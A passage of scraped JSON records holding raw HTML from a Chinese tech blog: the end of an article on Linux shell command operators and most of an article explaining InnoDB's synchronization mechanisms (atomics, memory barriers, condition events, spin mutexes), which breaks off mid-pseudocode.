!important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b1a4800494605-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b1a4800494605-1\"><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Command_x1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-v\">Command_x2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Command_x3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Command_x4</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>在上面的伪代码中，如果<strong>Command_x1</strong>执行失败，<strong>Command_x2</strong>不会执行，但是<strong>Command_x3</strong>会继续执行， <strong>Command_x4</strong>会依赖于 <strong>Command_x3</strong>的退出状态。</p>\n<h3>10. 连接符 ($$</h3>\n<p><strong>连接符 ()</strong>如它名字所说，被用于连接shell中那些太长而需要分成多行的命令。可以在输入一个“\\”之后就回车，然后继续输入命令行，直到输入完成。比如，下面的命令会打开文本文件<strong>test(1).txt</strong>。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b1a7234142046\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntecmint@localhost:~/Downloads$ nano test \\\r\n1.txt</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b1a7234142046-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4b8b1a7234142046-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b1a7234142046-1\"><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Downloads</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nano </span><span class=\"crayon-i\">test</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4b8b1a7234142046-2\"><span class=\"crayon-cn\">1.txt</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113305\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113305votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113305\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/582271a95a4505dff985ffc837868976.png"], "title": "MySQL 引擎特性：InnoDB 同步机制", "fav_nums": 2, "url": "http://blog.jobbole.com/113301/", "create_date": "2017/12/12", "url_object_id": "3ab9c8467092797d5700883d37f29d0d", "comment_nums": 0, "front_image_path": "full/76dac52543eae84f3fd038af336bf45c1c4c1efe.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/coderyuhui/p/6498400.html\">水中的泪</a>   </div><h2>前言</h2>\n<p>现代操作系统以及硬件基本都支持并发程序，而在并发程序设计中，各个进程或者线程需要对公共变量的访问加以制约，此外，不同的进程或者线程需要协同工作以完成特征的任务，这就需要一套完善的同步机制，在Linux内核中有相应的技术实现，包括原子操作，信号量，互斥锁，自旋锁，读写锁等。InnoDB考虑到效率和监控两方面的原因，实现了一套独有的同步机制，提供给其他模块调用。本文的分析默认基于MySQL 5.6，CentOS 6，gcc 4.8，其他版本的信息会另行指出。</p>\n<h2 id=\"基础知识\">基础知识</h2>\n<p>同步机制对于其他数据库模块来说相对独立，但是需要比较多的操作系统以及硬件知识，这里简单介绍一下几个有用的概念，便于读者理解后续概念。<br>\n<strong><em>内存模型 :</em></strong>主要分为语言级别的内存模型和硬件级别的内存模型。语言级别的内存模型，C/C++属于weak memory model，简单的说就是编译器在进行编译优化的时候，可以对指令进行重排，只需要保证在单线程的环境下，优化前和优化后执行结果一致即可，执行中间过程不保证跟代码的语义顺序一致。所以在多线程的环境下，如果依赖代码中间过程的执行顺序，程序就会出现问题。硬件级别的内存模型，我们常用的cpu，也属于弱内存模型，即cpu在执行指令的时候，为了提升执行效率，也会对某些执行进行乱序执行（按照wiki提供的资料，在x86 64环境下，只会发生读写乱序，即读操作可能会被乱序到写操作之前），如果在编程的时候不做一些措施，同样容易造成错误。<br>\n<strong><em>内存屏障 :</em></strong>为了解决弱内存模型造成的问题，需要一种能控制指令重排或者乱序执行程序的手段，这种技术就叫做内存屏障，程序员只需要在代码中插入特定的函数，就能控制弱内存模型带来的负面影响，当然，由于影响了乱序和重排这类的优化，对代码的执行效率有一定的影响。具体实现上，内存屏障技术分三种，一种是full memory barrier，即barrier之前的操作不能乱序或重排到barrier之后，同时barrier之后的操作不能乱序或重排到barrier之前，当然这种full barrier对性能影响最大，为了提高效率才有了另外两种：acquire barrier和release barrier，前者只保证barrier后面的操作不能移到之前，后者只保证barrier前面的操作不移到之后。<br>\n<strong><em>互斥锁 :</em></strong>互斥锁有两层语义，除了大家都知道的排他性（即只允许一个线程同时访问）外，还有一层内存屏障（full memory barrier）的语义，即保证临界区的操作不会被乱序到临界区外。Pthread库里面常用的mutex，conditional variable等操作都自带内存屏障这层语义。此外，使用pthread库，每次调用都需要应用程序从用户态陷入到内核态中查看当前环境，在锁冲突不是很严重的情况下，效率相对比较低。<br>\n<strong><em>自旋锁 :</em></strong>传统的互斥锁，只要一检测到锁被其他线程所占用了，就立刻放弃cpu时间片，把cpu留给其他线程，这就会产生一次上下文切换。当系统压力大的时候，频繁的上下文切换会导致sys值过高。自旋锁，在检测到锁不可用的时候，首先cpu忙等一小会儿，如果还是发现不可用，再放弃cpu，进行切换。互斥锁消耗cpu sys值，自旋锁消耗cpu usr值。<br>\n<strong><em>递归锁 :</em></strong>如果在同一个线程中，对同一个互斥锁连续加锁两次，即第一次加锁后，没有释放，继续进行对这个锁进行加锁，那么如果这个互斥锁不是递归锁，将导致死锁。可以把递归锁理解为一种特殊的互斥锁。<br>\n<strong><em>死锁 :</em></strong>构成死锁有四大条件，其中有一个就是加锁顺序不一致，如果能保证不同类型的锁按照某个特定的顺序加锁，就能大大降低死锁发生的概率，之所以不能完全消除，是因为同一种类型的锁依然可能发生死锁。另外，对同一个锁连续加锁两次，如果是非递归锁，也将导致死锁。</p>\n<h2 id=\"原子操作\">原子操作</h2>\n<p>现代的cpu提供了对单一变量简单操作的原子指令，即这个变量的这些简单操作只需要一条cpu指令即可完成，这样就不用对这个操作加互斥锁了，在锁冲突不激烈的情况下，减少了用户态和内核态的切换，化悲观锁为乐观锁，从而提高了效率。此外，现在外面很火的所谓无锁编程（类似CAS操作），底层就是用了这些原子操作。gcc为了方便程序员使用这些cpu原子操作，提供了一系列__sync开头的函数，这些函数如果包含内存屏障语义，则同时禁止编译器指令重排和cpu乱序执行。<br>\nInnoDB针对不同的操作系统以及编译器环境，自己封装了一套原子操作，在头文件os0sync.h中。下面的操作基于Linux x86 64位环境， gcc 4.1以上的版本进行分析。<br>\n<code>os_compare_and_swap_xxx(ptr, old_val, new_val)</code>类型的操作底层都使用了gcc包装的<code>__sync_bool_compare_and_swap(ptr, old_val, new_val)</code>函数，语义为，交换成功则返回true，ptr是交换后的值，old_val是之前的值，new_val是交换后的预期值。这个原子操作是个内存屏障（full memory barrier）。<br>\n<code>os_atomic_increment_xxx</code>类型的操作底层使用了函数<code>__sync_add_and_fetch</code>，<code>os_atomic_decrement_xxx</code>类型的操作使用了函数<code>__sync_sub_and_fetch</code>，分别表示原子递增和原子递减。这个两个原子操作也都是内存屏障（full memory barrier）。<br>\n另外一个比较重要的原子操作是<code>os_atomic_test_and_set_byte(ptr, new_val)</code>，这个操作使用了<code>__sync_lock_test_and_set(ptr, new_val)</code>这个函数，语义为，把ptr设置为new_val，同时返回旧的值。这个操作提供了原子改变某个变量值的操作，InnoDB锁实现的同步机制中，大量的用了这个操作，因此比较重要。需要注意的是，参看gcc文档，这个操作不是full memory barrier，只是一个acquire barrier，简单的说就是，代码中<code>__sync_lock_test_and_set</code>之后操作不能被乱序或者重排到<code>__sync_lock_test_and_set</code>之前，但是<code>__sync_lock_test_and_set</code>之前的操作可能被重排到其之后。<br>\n关于内存屏障的专门指令，MySQL 5.7提供的比较完善。<code>os_rmb</code>表示acquire barrier，<code>os_wmb</code>表示release barrier。如果在编程时，需要在某个位置准确的读取一个变量的值时，记得在读取之前加上os_rmb，同理，如果需要在某个位置保证一个变量已经被写了，记得在写之后调用os_wmb。</p>\n<h2 id=\"条件通知机制\">条件通知机制</h2>\n<p>条件通知机制在多线程协作中非常有用，一个线程往往需要等待其他线程完成指定工作后，再进行工作，这个时候就需要有线程等待和线程通知机制。<code>Pthread_cond_XXX</code>类似的变量和函数来完成等待和通知的工作。InnoDB中，对Pthread库进行了简单的封装，并在此基础上，进一步抽象，提供了一套方便易用的接口函数给调用者使用。</p>\n<h3 id=\"系统条件变量\">系统条件变量</h3>\n<p>在文件os0sync.cc中，<code>os_cond_XXX</code>类似的函数就是InnoDB对Pthread库的封装。常用的几个函数如：<br>\n<code>os_cond_t</code>是核心的操作对象，其实就是pthread_cond_t的一层typedef而已，<code>os_cond_init</code>初始化函数，<code>os_cond_destroy</code>销毁函数，<code>os_cond_wait</code>条件等待，不会超时，<code>os_cond_wait_timed</code>条件等待，如果超时则返回，<code>os_cond_broadcast</code>唤醒所有等待线程，<code>os_cond_signal</code>只唤醒其中一个等待线程，但是在阅读源码的时候发现，似乎没有什么地方调用了<code>os_cond_signal</code>。。。<br>\n此外，还有一个<code>os_cond_module_init</code>函数，用来window下的初始化操作。<br>\n在InnoDB下，<code>os_cond_XXX</code>模块的函数主要是给InnoDB自己设计的条件变量使用。</p>\n<h3 id=\"innodb条件变量\">InnoDB条件变量</h3>\n<p>如果在InnoDB层直接使用系统条件变量的话，主要有四个弊端，首先，弊端1，系统条件变量的使用需要与一个系统互斥锁（详见下一节）相配合使用，使用完还要记得及时释放，使用者会比较麻烦。接着，弊端2，在条件等待的时候，需要在一个循环中等待，使用者还是比较麻烦。最后，弊端3，也是比较重要的，不方便系统监控。<br>\n基于以上几点，InnoDB基于系统的条件变量和系统互斥锁自己实现了一套条件通知机制。主要在文件os0sync.cc中实现，相关数据结构以及接口进一层的包装在头文件os0sync.h中。使用方法如下：<br>\nInnoDB条件变量核心数据结构为<code>os_event_t</code>，类似<code>pthread_cont_t</code>。如果需要创建和销毁则分别使用<code>os_event_create</code>和<code>os_event_free</code>函数。需要等待某个条件变量，先调用<code>os_event_reset</code>（原因见下一段），然后使用<code>os_event_wait</code>，如果需要超时等待，使用<code>os_event_wait_time</code>替换<code>os_event_wait</code>即可，<code>os_event_wait_XXX</code>这两个函数，解决了弊端1和弊端2，此外，建议把<code>os_event_reset</code>返回值传给他们，这样能防止多线程情况下的无限等待（详见下下段）。如果需要发出一个条件通知，使用<code>os_event_set</code>。这个几个函数，里面都插入了一些监控信息，方便InnoDB上层管理。怎么样，方便多了吧~</p>\n<h4 id=\"多线程环境下可能发生的问题\">多线程环境下可能发生的问题</h4>\n<p>首先来说说两个线程下会发生的问题。创建后，正常的使用顺序是这样的，线程A首先<code>os_event_reset</code>（步骤1），然后<code>os_event_wait</code>（步骤2），接着线程B做完该做的事情后，执行<code>os_event_set</code>（步骤3）发送信号，通知线程A停止等待，但是在多线程的环境中，会出现以下两种步骤顺序错乱的情况：乱序A： <code>步骤1--步骤3--步骤2</code>，乱序B: <code>步骤3--步骤1--步骤2</code>。对于乱序B，属于条件通知在条件等待之前发生，目前InnoDB条件变量的机制下，会发生无限等待，所以上层调用的时候一定要注意，例如在InnoDB在实现互斥锁和读写锁的时候为了防止发生条件通知在条件等待之前发生，在等待之前对lock_word再次进行了判断，详见InnoDB自旋互斥锁这一节。为了解决乱序A，InnoDB在核心数据结构os_event中引入布尔型变量is_set，is_set这个变量就表示是否已经发生过条件通知，在每次调用条件通知之前，会把这个变量设置为true（在<code>os_event_reset</code>时改为false，便于多次通知），在条件等待之前会检查一下这变量，如果这个变量为true，就不再等待了。所以，乱序A也能保证不会发生无限等待。<br>\n接着我们来说说大于两个线程下可能会发生的问题。线程A和C是等待线程，等待同一个条件变量，B是通知线程，通知A和C结束等待。考虑一个乱序C：线程A执行<code>os_event_reset</code>（步骤1），线程B马上就执行<code>os_event_set</code>（步骤2）了，接着线程C执行了<code>os_event_reset</code>（步骤3），最后线程A执行<code>os_event_wait</code>（步骤4），线程C执行<code>os_event_wait</code>（步骤5）。乍一眼看，好像看不出啥问题，但是实际上你会发现A和C线程在无限等待了。原因是，步骤2，把is_set这个变量设置为false，但是在步骤3，线程C通过reset又把它给重新设回false了。。然后线程A和C在<code>os_event_wait</code>中误以为还没有发生过条件通知，就开始无限等待了。为了解决这个问题，InnoDB在核心数据结构os_event中引入64位整形变量signal_count，用来记录已经发出条件信号的次数。每次发出一个条件通知，这个变量就递增1。<code>os_event_reset</code>的返回值就把当前的signal_count值取出来。<code>os_event_wait</code>如果发现有这个参数的传入，就会判断传入的参数与当前的signal_count值是否相同，如果不相同，表示这个已经通知过了，就不会进入等待了。举个例子，假设乱序C，一开始的signal_count为100，步骤1把这个参数传给了步骤4，在步骤4中，<code>os_event_wait</code>会发现传入值100与当前的值101（步骤2中递增了1）不同，所以线程A认为信号已经发生过了，就不会再等待了。。。然而。。线程C呢？步骤3返回的值应该是101，传给步骤5后，发生于当前值一样。。继续等待。。。仔细分析可以发现，线程C是属于条件变量通知发生在等待之前（步骤2，步骤3，步骤5），上一段已经说过了，针对这种通知提前发出的，目前InnoDB没有非常好的解法，只能调用者自己控制。<br>\n总结一下， InnoDB条件变量能方便InnoDB上层做监控，也简化了条件变量使用的方法，但是调用者上层逻辑必须保证条件通知不能过早的发出，否则就会有无限等待的可能。</p>\n<h2 id=\"互斥锁\">互斥锁</h2>\n<p>互斥锁保证一段程序同时只能一个线程访问，保证临界区得到正确的序列化访问。同条件变量一样，InnoDB对Pthread的mutex简单包装了一下，提供给其他模块用（主要是辅助其他自己实现的数据结构，不用InnoDB自己的互斥锁是为了防止递归引用，详见辅助结构这一节）。但与条件变量不同的是，InnoDB自己实现的一套互斥锁并没有依赖Pthread库，而是依赖上述的原子操作（如果平台不支持原子操作则使用Pthread库，但是这种情况不太会发生，因为gcc在4.1就支持原子操作了）和上述的InnoDB条件变量。</p>\n<h3 id=\"系统互斥锁\">系统互斥锁</h3>\n<p>相比与系统条件变量，系统互斥锁除了包装Pthread库外，还做了一层简单的监控统计，结构名为<code>os_mutex_t</code>。在文件os0sync.cc中，<code>os_mutex_create</code>创建mutex，并调用<code>os_fast_mutex_init_func</code>创建pthread的mutex，值得一提的是，创建pthread mutex的参数是<code>my_fast_mutexattr</code>的东西，其在MySQL server层函数<code>my_thread_global_init</code>初始化 ，只要pthread库支持，则默认成初始化为PTHREAD_MUTEX_ADAPTIVE_NP和PTHREAD_MUTEX_ERRORCHECK。前者表示，当锁释放，之前在等待的锁进行公平的竞争，而不是按照默认的优先级模式。后者表示，如果发生了递归的加锁，即同一个线程对同一个锁连续加锁两次，第二次加锁会报错。另外三个有用的函数为，销毁锁<code>os_mutex_free</code>，加锁<code>os_mutex_enter</code>，解锁<code>os_mutex_exit</code>。<br>\n一般来说，InnoDB上层模块不需要直接与系统互斥锁打交道，需要用锁的时候一般用InnoDB自己实现的一套互斥锁。系统互斥锁主要是用来辅助实现一些数据结构，例如最后一节提到的一些辅助结构，由于这些辅助结构可能本身就要提供给InnoDB自旋互斥锁用，为了防止递归引用，就暂时用系统互斥锁来代替。</p>\n<h3 id=\"innodb自旋互斥锁\">InnoDB自旋互斥锁</h3>\n<p>为什么InnoDB需要实现自己的一套互斥锁，不直接用上述的系统互斥锁呢？这个主要有以下几个原因，首先，系统互斥锁是基于pthread mutex的，Heikki Tuuri（同步模块的作者，也是Innobase的创始人）认为在当时的年代pthread mutex上下文切换造成的cpu开销太大，使用spin lock的方式在多处理器的机器上更加有效，尤其是在锁竞争不是很严重的时候，Heikki Tuuri还总结出，在spin lock大概自旋20微秒的时候在多处理的机器下效率最高。其次，不使用pthread spin lock的原因是，当时在1995年左右的时候，spin lock的类似实现，效率很低，而且当时的spin lock不支持自定义自旋时间，要知道自旋锁在单处理器的机器上没什么卵用。最后，也是为了更加完善的监控需求。总的来说，有历史原因，有监控需求也有自定义自旋时间的需求，然后就有了这一套InnoDB自旋互斥锁。<br>\nInnoDB自旋互斥锁的实现主要在文件sync0sync.cc和sync0sync.ic中，头文件sync0sync.h定义了核心数据结构ib_mutex_t。使用方法很简单，<code>mutex_create</code>创建锁，<code>mutex_free</code>释放锁，<code>mutex_enter</code>尝试获得锁，如果已经被占用了，则等待。<code>mutex_exit</code>释放锁，同时唤醒所有等待的线程，拿到锁的线程开始执行，其余线程继续等待。<code>mutex_enter_nowait</code>这个函数类似pthread的trylock，只要已检测到锁不用，就直接返回错误，不进行自旋等待。总体来说，InnoDB自旋互斥锁的用法和语义跟系统互斥锁一模一样，但是底层实现却大相径庭。<br>\n在ib_mutex_t这个核心数据结构中，最重要的是前面两个变量：event和lock_word。lock_word为0表示锁空闲，1表示锁被占用，InnoDB自旋互斥锁使用<code>__sync_lock_test_and_set</code>这个函数对lock_word进行原子操作，加锁的时候，尝试把其设置为1，函数返回值不指示是否成功，指示的是尝试设置之前的值，因此如果返回值是0，表示加锁成功，返回是1表示失败。如果加锁失败，则会自旋一段时间，然后等待在条件变量event（<code>os_event_wait</code>）上，当锁占用者释放锁的时候，会使用<code>os_event_set</code>来唤醒所有的等待者。简单的来说，byte类型的lock_word基于平台提供的原子操作来实现互斥访问，而event是InnoDB条件变量类型，用来实现锁释放后唤醒等待线程的操作。</p>\n<p>接下来，详细介绍一下，<code>mutex_enter</code>和<code>mutex_exit</code>的逻辑，InnoDB自旋互斥锁的精华都在这两个函数中。<br>\nmutex_enter的伪代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39b4de311042946855\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nif (__sync_lock_test_and_set(mutex-&gt;lock_word, 1) == 0) {\r\n    get mutex successfully;\r\n    return;\r\n}\r\nloop1:\r\n    i = 0;\r\nloop2:\r\n    /*指示点1*/\r\n    while (mutex-&gt;lock_word ! = 0 &amp;&amp; i &lt; SPIN_ROUNDS) {\r\n             random spin using ut_delay, spin max time depend on SPIN_WAIT_DELAY;\r\n             i++;\r\n}\r\nif (i == SPIN_ROUNDS) {\r\n    yield_cpu;\r\n}\r\n/*指示点2*/\r\nif (__sync_lock_test_and_set(mutex-&gt;lock_word, 1) == 0) {\r\n    get mutex successfully;\r\n    return;\r\n}\r\nif (i &lt; SPIN_ROUNDS) {\r\n     goto loop2\r\n}\r\n/*指示点4*/\r\nget cell from sync array and call os_event_reset(mutex-&gt;event);\r\nmutex-&gt;waiter =1;\r\n/*指示点3*/\r\nfor (i = 0; i &lt; 4; i++) {\r\n    if (__sync_lock_test_and_set(mutex-&gt;lock_word, 1) == 0) {\r\n        get mutex successfully;\r\n        free cell;\r\n        return;\r\n    }\r\n}\r\nsync array wait and os_event_wait(mutex-&gt;event);\r\ngoto loop1;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39b4de311042946855-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39b4de311042946855-36\">36</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39b4de311042946855-1\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">__sync_lock_test_and_set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">mutex</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">lock_word</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39b4de311042946855-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">mutex </span><span class=\"crayon-v\">successfully</span><span 